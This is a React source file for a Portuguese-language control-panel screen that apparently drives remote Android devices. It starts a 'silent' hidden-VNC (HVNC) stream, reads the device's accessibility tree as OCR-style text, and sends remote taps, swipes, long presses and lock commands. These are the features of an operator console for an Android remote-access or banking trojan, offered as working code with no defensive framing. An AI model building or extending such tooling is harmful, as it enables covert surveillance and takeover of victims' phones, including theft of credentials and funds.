import { useEffect, useRef, useState, useCallback } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// ── Parse accessibility hierarchy JSON into flat node list ───────────────────
function parseHierarchy(data) {
  const nodes = [];
  function walk(node, depth = 0) {
    if (!node) return;
    const text = node.text || node.contentDescription || node.className || '';
    const hasText = text && text.trim().length > 0;
    const hasBounds = node.bounds && (node.bounds.right - node.bounds.left > 0);
    if (hasText || hasBounds) {
      nodes.push({
        text:     text.trim(),
        cls:      node.className || '',
        pkg:      node.packageName || '',
        clickable: !!node.clickable,
        enabled:   node.enabled !== false,
        checked:   !!node.checked,
        focused:   !!node.focused,
        scrollable:!!node.scrollable,
        bounds:    node.bounds || null,
        depth,
        id: node.viewIdResourceName || '',
      });
    }
    // Recurse children
    const children = node.children || node.childList || [];
    for (const child of children) walk(child, depth + 1);
  }

  try {
    const parsed = typeof data === 'string' ? JSON.parse(data) : data;
    // Handle array root or single root
    const roots = Array.isArray(parsed) ? parsed : [parsed];
    for (const root of roots) walk(root);
  } catch (_) {}
  return nodes;
}

// ── OCR-style text extraction — group by lines ────────────────────────────────
function extractLines(nodes) {
  // Keep only nodes with actual text, sort by vertical position
  const textNodes = nodes
    .filter(n => n.text && n.text.length > 0)
    .sort((a, b) => {
      if (!a.bounds || !b.bounds) return 0;
      return (a.bounds.top + a.bounds.bottom) / 2 - (b.bounds.top + b.bounds.bottom) / 2;
    });

  // Group into rows (nodes within 20px vertically of each other)
  const rows = [];
  let currentRow = [];
  let lastY = -Infinity;

  for (const node of textNodes) {
    const y = node.bounds ? (node.bounds.top + node.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 20 && currentRow.length > 0) {
      rows.push([...currentRow].sort((a, b) => (a.bounds?.left || 0) - (b.bounds?.left || 0)));
      currentRow = [];
    }
    currentRow.push(node);
    lastY = y;
  }
  if (currentRow.length > 0) rows.push(currentRow);
  return rows;
}

// ── Center of bounds → tap coords ─────────────────────────────────────────────
function boundsCenter(bounds) {
  if (!bounds) return null;
  return {
    x: Math.round((bounds.left + bounds.right) / 2),
    y: Math.round((bounds.top  + bounds.bottom) / 2),
  };
}

export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
  const canvasRef    = useRef(null);
  const vncActive    = useStore(s => s.vncActive);
  const setVnc       = useStore(s => s.setVncActive);

  const [mode, setMode]         = useState('EDITAR V2');
  const [nodes, setNodes]       = useState([]);
  const [lines, setLines]       = useState([]);
  const [toast, setToast]       = useState(null);
  const [ocrText, setOcrText]   = useState([]);   // streamed OCR entries
  const [filter, setFilter]     = useState('');
  const [lastHierarchyTs, setTs]= useState(null);
  const [fpsCount, setFpsCount] = useState(0);
  const [vncOn, setVncOn]       = useState(false);
  const [tab, setTab]           = useState('ocr'); // 'ocr' | 'nodes' | 'raw'
  const [rawData, setRawData]   = useState('');
  const ocrRef      = useRef([]);
  const fpsRef      = useRef(0);
  const touchStart  = useRef(null);
  const mouseDown   = useRef(null);
  const ocrScrollRef = useRef(null);

  // ── VNC binary frames ────────────────────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const blob = new Blob([buf], { type: 'image/jpeg' });
      const url  = URL.createObjectURL(blob);
      const img  = new Image();
      img.onload = () => {
        const c = canvasRef.current; if (!c) { URL.revokeObjectURL(url); return; }
        if (c.width !== img.naturalWidth)   c.width  = img.naturalWidth;
        if (c.height !== img.naturalHeight) c.height = img.naturalHeight;
        c.getContext('2d').drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        fpsRef.current++;
      };
      img.src = url;
    });
    const fpsTimer = setInterval(() => { setFpsCount(fpsRef.current); fpsRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(fpsTimer); };
  }, [deviceId]);

  // ── Hierarchy / Screen Reader messages ───────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;

      if (msg.type === 'screen_hierarchy') {
        const raw   = msg.data || '{}';
        const parsed = parseHierarchy(raw);
        const ls     = extractLines(parsed);
        setNodes(parsed);
        setLines(ls);
        setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
        setTs(msg.ts);
        showToast('Comando REQUEST_HIERARCHY com sucesso!');

        // Stream text into OCR log
        const textItems = parsed.filter(n => n.text).map(n => ({
          text:    n.text,
          clickable: n.clickable,
          bounds:  n.bounds,
          ts:      msg.ts,
        }));
        ocrRef.current = [...textItems, ...ocrRef.current].slice(0, 500);
        setOcrText([...ocrRef.current]);
        setTimeout(() => ocrScrollRef.current?.scrollTo({ top: 0, behavior: 'smooth' }), 50);
      }

      if (msg.type === 'vnc_status' && msg.active !== undefined) {
        setVncOn(msg.active);
        setVnc(msg.active);
      }
    });
    return unsub;
  }, [deviceId]);

  // ── Request hierarchy on mount (auto-read) ────────────────────────────────
  useEffect(() => {
    sendCmd('REQUEST_HIERARCHY');
  }, []);

  function showToast(msg) {
    setToast(msg);
    setTimeout(() => setToast(null), 2500);
  }

  // ── VNC controls ──────────────────────────────────────────────────────────
  function startVnc() {
    sendCmd('START_SILENT_VNC');
    ws.subscribe('vnc', deviceId);
    setVncOn(true); setVnc(true);
  }
  function stopVnc() {
    sendCmd('STOP_SILENT_VNC');
    ws.unsubscribe('vnc', deviceId);
    setVncOn(false); setVnc(false);
  }

  // ── Canvas touch → tap/swipe ──────────────────────────────────────────────
  const getScaled = (cx, cy) => {
    const c = canvasRef.current; if (!c) return { x: 0, y: 0 };
    const r = c.getBoundingClientRect();
    return { x: Math.round((cx - r.left) * c.width / r.width),
             y: Math.round((cy - r.top)  * c.height / r.height) };
  };
  const onTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    touchStart.current = { ...getScaled(t.clientX, t.clientY), ts: Date.now() };
  }, []);
  const onTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!touchStart.current) return;
    const t = e.changedTouches[0];
    const end = getScaled(t.clientX, t.clientY);
    const { x: sx, y: sy, ts } = touchStart.current;
    const dt = Date.now() - ts;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 10) sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: dt });
    touchStart.current = null;
  }, [sendCmd]);
  const onMouseDown = e => {
    mouseDown.current = { ...getScaled(e.clientX, e.clientY), ts: Date.now() };
  };
  const onMouseUp = e => {
    if (!mouseDown.current) return;
    const end = getScaled(e.clientX, e.clientY);
    const { x: sx, y: sy, ts } = mouseDown.current;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 8) sendCmd('TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: Date.now() - ts });
    mouseDown.current = null;
  };

  // ── Tap a node from the list ───────────────────────────────────────────────
  function tapNode(node) {
    const c = boundsCenter(node.bounds);
    if (c) sendCmd('TAP', c);
  }

  const filteredNodes = filter
    ? nodes.filter(n => n.text?.toLowerCase().includes(filter.toLowerCase()) ||
                        n.cls?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  const MODES = ['EDITAR V2', 'VNC', 'V2', 'DUPLO'];

  return (
    <div className="fade-up">
      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 72, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(18,14,4,.97)', border: '1px solid var(--gold)',
          borderRadius: 12, padding: '12px 20px', zIndex: 9999,
          maxWidth: '85vw', textAlign: 'center', pointerEvents: 'none',
          boxShadow: '0 4px 24px rgba(0,0,0,.5)',
        }}>
          <div style={{ color: '#00c864', fontSize: 18, marginBottom: 4 }}>✓</div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 13 }}>Comando</div>
          <div style={{ color: '#00c864', fontWeight: 800, fontSize: 14 }}>REQUEST_HIERARCHY</div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 13 }}>com sucesso!</div>
        </div>
      )}

      {/* Toolbar — matches reference image exactly */}
      <div className="row-sb mb10">
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            EDITAR V2 ✏
          </div>
          <div className="row gap6 mt4">
            <span style={{ fontSize: 11, color: 'var(--text2)' }}>LEITOR OCR</span>
            <span style={{ fontSize: 11, color: '#00c864', fontWeight: 700 }}>⚡</span>
            <span style={{ fontSize: 11, color: '#00c864', fontWeight: 700 }}>
              {nodes.filter(n => n.text).length > 0 ? '85%' : '—'}
            </span>
          </div>
        </div>
        <div className="row gap5" style={{ flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {MODES.map(m => (
            <button key={m} onClick={() => setMode(m)}
              className={`btn btn-sm ${mode === m ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700 }}>{m}</button>
          ))}
          <button className="btn btn-ghost btn-sm"
            onClick={() => { stopVnc(); onBack(); }}>←</button>
        </div>
      </div>

      {/* VNC Canvas */}
      {(mode === 'VNC' || mode === 'DUPLO' || vncOn) && (
        <div className="vnc-wrap mb10"
          onTouchStart={onTouchStart} onTouchEnd={onTouchEnd}
          onMouseDown={onMouseDown}   onMouseUp={onMouseUp}
          style={{ position: 'relative' }}
        >
          <canvas ref={canvasRef} className="vnc-canvas" width={360} height={680} />
          {!vncOn && (
            <div className="vnc-overlay">
              <div className="spin" />
              <div style={{ fontSize: 12, color: 'var(--text2)' }}>Iniciando VNC...</div>
            </div>
          )}
          {vncOn && (
            <div className="vnc-hud">
              <span className="vnc-fps" style={{ background: 'rgba(20,80,200,.85)' }}>HVNC</span>
              <span className="vnc-fps">{fpsCount} FPS</span>
              {nodes.length > 0 && (
                <span className="vnc-fps" style={{ background: 'rgba(0,180,80,.7)' }}>
                  {nodes.filter(n => n.text).length} nodes
                </span>
              )}
            </div>
          )}
        </div>
      )}

      {/* VNC controls */}
      <div className="grid g2 mb10">
        <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ VNC ON</button>
        <button className="btn btn-red btn-block btn-sm"  onClick={stopVnc}>⏹ VNC OFF</button>
      </div>

      {/* EDITAR V2 / LEITOR OCR section */}
      {(mode === 'EDITAR V2' || mode === 'V2' || mode === 'DUPLO') && (
        <>
          {/* Action bar */}
          <div className="row gap6 mb10" style={{ flexWrap: 'wrap' }}>
            <button className="btn btn-gold btn-sm"
              onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('Aguardando hierarquia...'); }}>
              🌳 REQUEST_HIERARCHY
            </button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>
              👁 SR ON
            </button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>
              ⏹ SR OFF
            </button>
            <button className="btn btn-ghost btn-sm" onClick={() => { ocrRef.current = []; setOcrText([]); }}>
              🗑 CLEAR
            </button>
          </div>

          {/* Tab switcher */}
          <div className="row gap6 mb8">
            {[['ocr','📄 OCR TEXT'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id, label]) => (
              <button key={id} onClick={() => setTab(id)}
                className={`btn btn-sm ${tab === id ? 'btn-gold' : 'btn-ghost'}`}>
                {label}
              </button>
            ))}
            {lastHierarchyTs && (
              <span className="txt-xs txt-dim" style={{ alignSelf: 'center', marginLeft: 'auto' }}>
                {new Date(lastHierarchyTs).toLocaleTimeString()}
              </span>
            )}
          </div>

          {/* ── OCR TEXT TAB — matches reference: clean text list from hierarchy ── */}
          {tab === 'ocr' && (
            <div>
              {/* Stats */}
              <div className="row gap8 mb8">
                <span className="pill pill-green">{nodes.filter(n => n.text).length} textos</span>
                <span className="pill pill-gold">{nodes.filter(n => n.clickable).length} clicáveis</span>
                <span className="pill pill-dim">{lines.length} linhas</span>
              </div>

              {/* Line-grouped OCR output — matches how hierarchy looks on screen */}
              <div ref={ocrScrollRef}
                style={{ maxHeight: 420, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
                {lines.length === 0 && (
                  <div className="no-data" style={{ padding: 32 }}>
                    <div style={{ fontSize: 32, marginBottom: 8 }}>🌳</div>
                    <div>Toque REQUEST_HIERARCHY para ler a tela</div>
                  </div>
                )}
                {lines.map((row, ri) => (
                  <div key={ri} style={{
                    display: 'flex', gap: 4, flexWrap: 'wrap',
                    padding: '4px 8px', borderRadius: 6,
                    background: ri % 2 === 0 ? 'rgba(212,149,10,.04)' : 'transparent',
                  }}>
                    {row.map((node, ni) => (
                      <button key={ni}
                        onClick={() => tapNode(node)}
                        style={{
                          background: node.clickable
                            ? 'rgba(212,149,10,.12)' : 'rgba(255,255,255,.04)',
                          border: `1px solid ${node.clickable ? 'rgba(212,149,10,.4)' : 'rgba(255,255,255,.08)'}`,
                          borderRadius: 6, padding: '4px 10px',
                          color: node.clickable ? 'var(--gold)' : 'var(--text2)',
                          fontSize: 12, fontWeight: node.clickable ? 700 : 400,
                          cursor: node.clickable ? 'pointer' : 'default',
                          fontFamily: 'var(--font)',
                          transition: 'background .1s',
                        }}
                        title={`${node.cls}\n${node.id}\n${JSON.stringify(node.bounds)}`}
                      >
                        {node.text}
                        {node.checked && <span style={{ marginLeft: 4, color: '#00c864' }}>✓</span>}
                      </button>
                    ))}
                  </div>
                ))}
              </div>

              {/* Live OCR stream */}
              {ocrText.length > 0 && (
                <div style={{ marginTop: 12 }}>
                  <div className="section-title" style={{ marginBottom: 6 }}>
                    <span>📡</span> Stream OCR
                  </div>
                  <div className="term" style={{ height: 150, overflowY: 'auto' }}>
                    {ocrText.slice(0, 100).map((item, i) => (
                      <div key={i} className="log-line"
                        onClick={() => item.bounds && sendCmd('TAP', boundsCenter(item.bounds))}
                        style={{ cursor: item.clickable ? 'pointer' : 'default' }}>
                        <span className="log-ts">{item.ts ? new Date(item.ts).toLocaleTimeString() : ''}</span>
                        <span className={`log-text ${item.clickable ? 'log-cmd' : ''}`}>{item.text}</span>
                        {item.clickable && <span style={{ color: 'var(--text3)', fontSize: 10, marginLeft: 6 }}>tap</span>}
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ── NODES TAB — all accessibility nodes with bounds and class ── */}
          {tab === 'nodes' && (
            <div>
              <div className="input-row mb8">
                <input className="input" placeholder="Filtrar nós..." value={filter}
                  onChange={e => setFilter(e.target.value)} />
                <span className="txt-xs txt-dim" style={{ alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  {filteredNodes.length} / {nodes.length}
                </span>
              </div>
              <div style={{ maxHeight: 480, overflowY: 'auto' }}>
                {filteredNodes.slice(0, 200).map((node, i) => (
                  <div key={i} className="card card-sm mb4"
                    style={{
                      borderLeft: `3px solid ${node.clickable ? 'var(--gold)' : node.focused ? '#3b7af0' : 'var(--border)'}`,
                      cursor: node.clickable ? 'pointer' : 'default',
                      paddingLeft: 10 + node.depth * 8,
                    }}
                    onClick={() => node.clickable && tapNode(node)}
                  >
                    <div className="row-sb">
                      <div className="flex1" style={{ minWidth: 0 }}>
                        {node.text && (
                          <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--text)', marginBottom: 2 }}>
                            {node.text}
                          </div>
                        )}
                        <div className="txt-xs txt-mono txt-dim ellipsis">
                          {node.cls.split('.').pop() || node.cls}
                          {node.id && <span style={{ marginLeft: 6, color: 'var(--text3)' }}>#{node.id.split('/').pop()}</span>}
                        </div>
                      </div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 3, alignItems: 'flex-end', flexShrink: 0 }}>
                        {node.clickable  && <span className="pill pill-gold"  style={{ fontSize: 9, padding: '1px 6px' }}>CLICK</span>}
                        {node.scrollable && <span className="pill pill-blue"  style={{ fontSize: 9, padding: '1px 6px' }}>SCROLL</span>}
                        {node.checked    && <span className="pill pill-green" style={{ fontSize: 9, padding: '1px 6px' }}>✓ ON</span>}
                        {!node.enabled   && <span className="pill pill-dim"   style={{ fontSize: 9, padding: '1px 6px' }}>DISABLED</span>}
                      </div>
                    </div>
                    {node.bounds && (
                      <div className="txt-xs txt-mono txt-dim mt4" style={{ fontSize: 10 }}>
                        [{node.bounds.left},{node.bounds.top}] → [{node.bounds.right},{node.bounds.bottom}]
                        {' '}({node.bounds.right - node.bounds.left}×{node.bounds.bottom - node.bounds.top})
                      </div>
                    )}
                  </div>
                ))}
                {filteredNodes.length > 200 && (
                  <div className="txt-xs txt-dim" style={{ textAlign: 'center', padding: 8 }}>
                    ... {filteredNodes.length - 200} nós restantes
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ── RAW TAB — raw JSON ── */}
          {tab === 'raw' && (
            <div>
              <div className="row-sb mb6">
                <span className="txt-xs txt-dim">{rawData.length} chars</span>
                <button className="btn btn-ghost btn-xs"
                  onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}>
                  📋 COPIAR
                </button>
              </div>
              <div className="term" style={{ height: 480, overflowY: 'auto', whiteSpace: 'pre', fontSize: 10, lineHeight: 1.5 }}>
                {rawData || 'Nenhum dado. Toque REQUEST_HIERARCHY.'}
              </div>
            </div>
          )}
        </>
      )}

      {/* Nav shortcuts */}
      <div className="section-title mt12"><span>⚙</span>Navegação Rápida</div>
      <div className="grid g4 mb8">
        {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['💡','WAKEUP'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['🔒','LOCK_DEVICE'],['📷','SNAP_SCREEN']
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>
      <div style={{ height: 24 }} />
    </div>
  );
}
